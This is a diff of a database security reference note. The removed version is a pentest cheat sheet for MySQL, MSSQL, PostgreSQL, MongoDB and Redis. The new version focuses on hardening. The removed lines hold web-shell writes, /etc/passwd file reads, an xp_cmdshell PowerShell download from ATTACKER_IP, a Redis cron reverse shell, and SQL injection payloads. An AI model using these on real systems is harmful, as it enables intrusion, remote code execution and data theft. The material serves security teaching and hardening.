@@ -1,395 +1,270 @@
-﻿---
+---
 title: Database Security Reference
 tags:
   - reference
   - database
-  - SQL
-  - MySQL
-  - PostgreSQL
-  - MSSQL
-  - MongoDB
   - security
-  - cheat-sheet
-  - intermediate
-created: 2026-03-26
-updated: 2026-03-26
-source: CIS MySQL/MSSQL Benchmarks, OWASP SQL Injection Prevention Cheat Sheet,
-  official vendor docs
+  - sql
+  - mysql
+  - postgresql
+  - mssql
+topic: Reference
 difficulty: intermediate
+created: 2026-05-16
+updated: 2026-05-16
+source: OWASP, CIS Benchmarks, Microsoft SQL Server docs
 ---
 
-# 🗄️ Database Security Reference
+# Database Security Reference
 
 ## Overview
-Databases are among the most targeted systems in any environment — they store credentials, PII, financial data, and intellectual property. This note covers security-relevant commands, common misconfigurations, attack patterns, and hardening for the most widely used database systems.
+Databases are the most common target in breaches — they hold credentials, PII, financial records, and application secrets. This reference covers hardening, common attack vectors, and security controls across the most common database engines.
+
+---
+
+## Common Database Ports
+
+| Database | Default Port |
+|----------|-------------|
+| MySQL / MariaDB | 3306 |
+| PostgreSQL | 5432 |
+| Microsoft SQL Server | 1433 |
+| Oracle | 1521 |
+| MongoDB | 27017 |
+| Redis | 6379 |
+| SQLite | (file-based, no port) |
 
 ---
 
 ## MySQL / MariaDB
 
-### Reconnaissance
-```bash
-# Connect
-mysql -u root -p -h TARGET_IP
-mysql -u root -p                    # Local connection
-
-# After connecting — key queries
-SHOW DATABASES;
-USE database_name;
-SHOW TABLES;
-DESCRIBE table_name;
-SELECT user, host, authentication_string FROM mysql.user;   -- List users
-SHOW GRANTS FOR 'username'@'host';                          -- User privileges
-SHOW VARIABLES LIKE 'secure_file_priv';                     -- File read/write path
-SHOW VARIABLES LIKE 'have_ssl';                             -- SSL status
-SELECT @@version;                                           -- Version
-SELECT @@datadir;                                           -- Data directory
-SELECT @@hostname;                                          -- Hostname
-```
-
-### Common Attack Vectors
-
-**Read local files (requires FILE privilege):**
+### Hardening Checklist
 ```sql
-SELECT LOAD_FILE('/etc/passwd');
-SELECT LOAD_FILE('/var/www/html/config.php');
-```
+-- Run mysql_secure_installation after install
+-- Removes: anonymous users, test DB, root remote login
 
-**Write files (requires FILE privilege + writable path):**
-```sql
-SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
--- Results in web shell if web root is writable
--- secure_file_priv must be empty or set to the target path
-```
+-- Check who can login from where
+SELECT user, host, authentication_string FROM mysql.user;
 
-**User Defined Functions (UDF) — code execution:**
-```sql
--- If lib_mysqludf_sys is installed (older systems):
-SELECT sys_exec('id');
-SELECT sys_eval('cat /etc/passwd');
-```
-
-### MySQL Hardening
-```sql
--- Delete anonymous accounts
+-- Remove anonymous users
 DELETE FROM mysql.user WHERE User='';
 
--- Remove remote root login
+-- Disable remote root login
 DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');
 
--- Remove test database
-DROP DATABASE IF EXISTS test;
-DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';
+-- Revoke all from a user and re-grant only what's needed
+REVOKE ALL PRIVILEGES ON *.* FROM 'appuser'@'localhost';
+GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'appuser'@'localhost';
 
--- Apply changes
-FLUSH PRIVILEGES;
-
--- Principle of least privilege — create limited user
-CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'StrongPassword!';
-GRANT SELECT, INSERT, UPDATE, DELETE ON appdb.* TO 'appuser'@'localhost';
 FLUSH PRIVILEGES;
 ```
 
-```bash
-# mysql_secure_installation — interactive hardening wizard
-sudo mysql_secure_installation
-# Run this on every new MySQL installation
+### Useful Security Queries
+```sql
+-- Show all user privileges
+SHOW GRANTS FOR 'username'@'host';
+
+-- Find users with all privileges
+SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';
+
+-- Check if logging is enabled
+SHOW VARIABLES LIKE 'general_log';
+SHOW VARIABLES LIKE 'slow_query_log';
+
+-- Enable binary logging (for audit trail)
+-- In my.cnf: log_bin = /var/log/mysql/mysql-bin.log
 ```
 
----
+### SQL Injection Prevention (MySQL)
+```php
+// Prepared statements — the correct approach
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->execute([$username, $password]);
 
-## Microsoft SQL Server (MSSQL)
-
-### Reconnaissance
-```sql
--- Version
-SELECT @@VERSION;
-
--- Current database and user
-SELECT DB_NAME(); SELECT SYSTEM_USER; SELECT USER_NAME(); SELECT IS_SRVROLEMEMBER('sysadmin');
-
--- List databases
-SELECT name FROM master.dbo.sysdatabases;
-
--- List tables in current DB
-SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE';
-
--- List users and roles
-SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U','G');
-EXEC sp_helpsrvrolemember 'sysadmin';    -- Members of sysadmin role
-
--- Linked servers (lateral movement opportunities)
-EXEC sp_linkedservers;
-SELECT * FROM sys.servers;
-```
-
-### xp_cmdshell — OS Command Execution
-
-`xp_cmdshell` is a stored procedure that executes OS commands as the SQL Server service account.
-
-```sql
--- Check if enabled
-EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell';
-
--- Enable (requires sysadmin)
-EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-
--- Execute commands
-EXEC xp_cmdshell 'whoami';
-EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/shell.ps1'')"';
-
--- Disable (hardening)
-EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
-```
-
-### Linked Server Exploitation
-```sql
--- If a linked server exists, execute queries on it
-SELECT * FROM OPENQUERY(LINKEDSERVER, 'SELECT @@VERSION');
-EXEC ('xp_cmdshell ''whoami''') AT LINKEDSERVER;
-```
-
-### MSSQL Hardening
-```sql
--- Disable xp_cmdshell
-EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
-
--- Disable Ole Automation Procedures
-EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
-
--- Disable CLR Integration
-EXEC sp_configure 'clr enabled', 0; RECONFIGURE;
-
--- Principle of least privilege — create limited login
-CREATE LOGIN appuser WITH PASSWORD = 'StrongPassword!';
-CREATE USER appuser FOR LOGIN appuser;
-GRANT SELECT, INSERT, UPDATE, DELETE ON dbo.tablename TO appuser;
-
--- Audit: find accounts with sysadmin
-EXEC sp_helpsrvrolemember 'sysadmin';
+// Never do this
+$query = "SELECT * FROM users WHERE username = '$username'";
 ```
 
 ---
 
 ## PostgreSQL
 
-### Reconnaissance
+### Hardening Checklist
 ```bash
-# Connect
-psql -U postgres -h TARGET_IP -d database_name
-psql -U postgres                   # Local connection
+# pg_hba.conf — controls client authentication
+# Default is trust (no password) — change to md5 or scram-sha-256
+# /etc/postgresql/{version}/main/pg_hba.conf
 
-# Key queries
-\list                              -- List databases
-\connect database_name             -- Connect to database
-\dt                                -- List tables
-\du                                -- List users and roles
-SELECT version();                  -- Version
-SELECT current_user;               -- Current user
-SELECT rolname, rolsuper, rolcreaterole FROM pg_roles;  -- All roles and privileges
-SHOW data_directory;               -- Data directory
+# postgresql.conf — change listen address from * to specific IP
+listen_addresses = 'localhost'
+
+# Disable pg_stat_statements exposure to non-superusers
 ```
-
-### PostgreSQL Code Execution
 
 ```sql
--- Copy command — write files (requires superuser)
-COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
+-- Create application user with minimal privileges
+CREATE USER appuser WITH PASSWORD 'strongpassword';
+GRANT CONNECT ON DATABASE mydb TO appuser;
+GRANT USAGE ON SCHEMA public TO appuser;
+GRANT SELECT, INSERT, UPDATE ON ALL TABLES IN SCHEMA public TO appuser;
 
--- Large Object (lo) — read files
-SELECT lo_import('/etc/passwd');
-SELECT data FROM pg_largeobject WHERE loid = [oid];
+-- Check roles
+\du   -- in psql
 
--- COPY read file
-CREATE TABLE temp_file (data text);
-COPY temp_file FROM '/etc/passwd';
-SELECT * FROM temp_file;
-DROP TABLE temp_file;
+-- Check database permissions
+\l
+
+-- Audit: find superusers
+SELECT usename, usesuper FROM pg_user WHERE usesuper = true;
+
+-- Enable logging
+ALTER SYSTEM SET log_connections = 'on';
+ALTER SYSTEM SET log_disconnections = 'on';
+ALTER SYSTEM SET log_statement = 'all';   -- Verbose — use 'ddl' in production
+SELECT pg_reload_conf();
 ```
 
-### PostgreSQL Hardening
+---
+
+## Microsoft SQL Server
+
+### Hardening Checklist
 ```sql
--- Revoke public schema access
-REVOKE CREATE ON SCHEMA public FROM PUBLIC;
+-- Disable SA account if not needed
+ALTER LOGIN sa DISABLE;
 
--- Create limited role
-CREATE ROLE appuser WITH LOGIN PASSWORD 'StrongPassword!';
-GRANT CONNECT ON DATABASE appdb TO appuser;
-GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO appuser;
+-- Check for accounts with sysadmin role
+SELECT name FROM sys.server_principals
+WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
 
--- Check pg_hba.conf — controls connection authentication
--- Location: SHOW hba_file;
--- Use md5 or scram-sha-256, not trust
+-- Disable xp_cmdshell (allows OS command execution)
+EXEC sp_configure 'xp_cmdshell', 0;
+RECONFIGURE;
+
+-- Disable CLR integration if not needed
+EXEC sp_configure 'clr enabled', 0;
+RECONFIGURE;
+
+-- Disable remote admin connections
+EXEC sp_configure 'remote admin connections', 0;
+RECONFIGURE;
+
+-- Check linked servers (potential lateral movement)
+SELECT name, product, provider FROM sys.servers WHERE is_linked = 1;
+
+-- Audit logins
+SELECT name, type_desc, is_disabled, create_date
+FROM sys.server_principals
+WHERE type IN ('S', 'U', 'G')
+ORDER BY create_date DESC;
+```
+
+### SQL Server Attack Surface (for pen tests)
+```sql
+-- xp_cmdshell — execute OS commands (if enabled)
+EXEC xp_cmdshell 'whoami';
+
+-- Linked server abuse
+EXEC ('SELECT * FROM master..sysdatabases') AT [linked_server_name];
+
+-- Impersonation
+EXECUTE AS LOGIN = 'sa';
+SELECT SYSTEM_USER;
+REVERT;
 ```
 
 ---
 
-## MongoDB
+## Encryption at Rest
 
-### Reconnaissance
-```bash
-# Connect (no auth by default on older versions)
-mongo --host TARGET_IP
-mongosh --host TARGET_IP
-
-# Key commands
-show dbs
-use database_name
-show collections
-db.collection_name.find()            # Dump all documents
-db.collection_name.find().limit(5)   # First 5 documents
-db.getUsers()                        # List users (requires auth)
-db.adminCommand({listDatabases: 1})  # List databases
-```
-
-### Common Misconfigurations
-```bash
-# Default — no auth required on older installations
-# Check: listen on 0.0.0.0:27017 = internet-exposed if no firewall
-mongo --host TARGET_IP:27017 --eval "db.adminCommand({listDatabases:1})"
-
-# Shodan query for exposed MongoDB: port:27017 product:MongoDB
-```
-
-### MongoDB Hardening
-```bash
-# Enable authentication in /etc/mongod.conf
-security:
-  authorization: enabled
-
-# Create admin user before enabling auth
-use admin
-db.createUser({
-  user: "adminUser",
-  pwd: "StrongPassword!",
-  roles: [{role: "userAdminAnyDatabase", db: "admin"}]
-})
-
-# Bind to localhost only — in mongod.conf
-net:
-  bindIp: 127.0.0.1
-
-# Enable TLS
-net:
-  tls:
-    mode: requireTLS
-    certificateKeyFile: /etc/ssl/mongodb.pem
-```
-
----
-
-## Redis
-
-### Reconnaissance
-```bash
-# Connect (no auth by default)
-redis-cli -h TARGET_IP
-redis-cli -h TARGET_IP -p 6379
-
-# Key commands
-INFO server                 # Version, OS, config file path
-INFO all                    # Everything
-CONFIG GET *                # All config settings
-CONFIG GET requirepass      # Check if password is set
-KEYS *                      # List all keys (careful — blocks on large DBs)
-DBSIZE                      # Number of keys
-GET key_name                # Get value of a key
-```
-
-### Redis Code Execution via Config Rewrite
-
-Redis can be configured to write its files — if accessible without auth, this enables RCE:
-
-```bash
-# Write SSH public key to root's authorized_keys
-CONFIG SET dir /root/.ssh
-CONFIG SET dbfilename authorized_keys
-SET payload "\n\nssh-rsa AAAAB3NzaC1yc2E... attacker@machine\n\n"
-BGSAVE
-
-# Write a cron job
-CONFIG SET dir /var/spool/cron
-CONFIG SET dbfilename root
-SET cron "\n\n* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
-BGSAVE
-```
-
-### Redis Hardening
-```bash
-# In /etc/redis/redis.conf
-requirepass YourStrongPassword    # Enable authentication
-bind 127.0.0.1                    # Bind to localhost only
-rename-command CONFIG ""          # Disable CONFIG command
-rename-command FLUSHALL ""        # Disable dangerous commands
-protected-mode yes                # Refuse connections from non-loopback without auth
-```
-
----
-
-## SQL Injection Quick Reference (Attacker Testing)
-
-See also: SQLmap, Web-Application-Testing, OWASP-Top-10
+| Database | Method |
+|----------|--------|
+| MySQL | InnoDB tablespace encryption, MySQL Enterprise TDE |
+| PostgreSQL | pgcrypto extension, filesystem encryption (LUKS) |
+| SQL Server | Transparent Data Encryption (TDE) |
+| SQLite | SQLCipher (third-party) |
 
 ```sql
--- Detection payloads
-'
-''
-' OR '1'='1
-' AND '1'='2
-
--- MySQL UNION-based extraction
-' UNION SELECT NULL,NULL,NULL-- -              -- Find column count
-' UNION SELECT @@version,NULL,NULL-- -         -- Extract version
-' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -
-' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
-' UNION SELECT username,password,NULL FROM users-- -
-
--- Time-based blind (MySQL)
-' AND SLEEP(5)-- -
-' AND IF(1=1,SLEEP(5),0)-- -
-
--- Boolean-based blind
-' AND 1=1-- -    (true)
-' AND 1=2-- -    (false)
+-- SQL Server TDE
+CREATE MASTER KEY ENCRYPTION BY PASSWORD = 'StrongPassword!';
+CREATE CERTIFICATE TDECert WITH SUBJECT = 'TDE Certificate';
+CREATE DATABASE ENCRYPTION KEY WITH ALGORITHM = AES_256 ENCRYPTION BY SERVER CERTIFICATE TDECert;
+ALTER DATABASE mydb SET ENCRYPTION ON;
 ```
 
 ---
 
-## Database Hardening Checklist
+## Encryption in Transit
 
-```
-☐ Change default passwords for all built-in accounts
-☐ Remove unused default databases and accounts
-☐ Apply principle of least privilege — app accounts need only SELECT/INSERT/UPDATE/DELETE
-☐ Bind to localhost or internal IP only — never 0.0.0.0 unless required
-☐ Enable TLS for all client connections
-☐ Enable audit logging (track who accessed what and when)
-☐ Disable dangerous features (xp_cmdshell, FILE privilege, Redis CONFIG)
-☐ Keep database software patched
-☐ Firewall: only allow DB port from application servers, not from internet
-☐ Encrypt data at rest (TDE for MSSQL, MySQL encryption, pgcrypto for PostgreSQL)
-☐ Regular backups — encrypted, offsite, tested
-☐ Scan for exposed databases on internet (Shodan: port:3306, port:5432, port:27017, port:6379)
+```bash
+# MySQL — require SSL
+# In my.cnf:
+# require_secure_transport = ON
+
+# Verify SSL in MySQL
+SHOW VARIABLES LIKE '%ssl%';
+
+# PostgreSQL — require SSL in pg_hba.conf
+# hostssl  all  all  0.0.0.0/0  scram-sha-256
+
+# SQL Server — force encryption in connection string
+# Encrypt=Yes;TrustServerCertificate=No
 ```
 
 ---
 
-## Related Notes
-- SQLmap
-- OWASP-Top-10
-- Web-Application-Testing
-- Linux-Commands
-- Common-Ports
+## Principle of Least Privilege
 
-## References
-- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
-- CIS MySQL Benchmark: https://www.cisecurity.org/benchmark/mysql
-- CIS Microsoft SQL Server Benchmark: https://www.cisecurity.org/benchmark/microsoft_sql_server
-- PostgreSQL Security Documentation: https://www.postgresql.org/docs/current/security.html
-- MongoDB Security Checklist: https://www.mongodb.com/docs/manual/administration/security-checklist/
-- Redis Security Documentation: https://redis.io/docs/management/security/
+Every application should connect with a database account that has only the permissions it needs:
+
+| Application Type | Permissions Needed |
+|-----------------|-------------------|
+| Read-only API | SELECT only |
+| Standard CRUD app | SELECT, INSERT, UPDATE, DELETE |
+| App with schema changes | + ALTER, CREATE |
+| Admin/migration tool | Full schema rights (never for app user) |
+| Backup user | SELECT + LOCK TABLES (MySQL) / pg_dump role |
+
+---
+
+## Auditing and Logging
+
+```sql
+-- MySQL: General query log (high volume — use carefully)
+SET GLOBAL general_log = 'ON';
+SET GLOBAL general_log_file = '/var/log/mysql/general.log';
+
+-- PostgreSQL: Log all DDL statements
+ALTER SYSTEM SET log_statement = 'ddl';
+SELECT pg_reload_conf();
+
+-- SQL Server: Server Audit
+CREATE SERVER AUDIT MyAudit
+TO FILE (FILEPATH = 'C:\Audits\');
+ALTER SERVER AUDIT MyAudit WITH (STATE = ON);
+```
+
+---
+
+## Key Terms
+
+| Term | Definition |
+|------|------------|
+| TDE | Transparent Data Encryption — encrypts data files at rest |
+| SQL Injection | Attack that inserts malicious SQL into a query |
+| Prepared Statement | Parameterized query that separates code from data |
+| Least Privilege | Granting only the minimum access required |
+| pg_hba.conf | PostgreSQL host-based authentication configuration file |
+| xp_cmdshell | SQL Server stored procedure that runs OS commands |
+| Linked Server | SQL Server feature connecting to a remote DB server |
+
+## Sources
+
+OWASP Foundation. (2021). *SQL injection prevention cheat sheet*. https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+
+Center for Internet Security. (2023). *CIS Microsoft SQL Server benchmark*. https://www.cisecurity.org/benchmark/microsoft_sql_server
+
+PostgreSQL Global Development Group. (2024). *PostgreSQL documentation: Client authentication*. https://www.postgresql.org/docs/current/client-authentication.html
 
 ---
 <- [[Reference-MOC]]
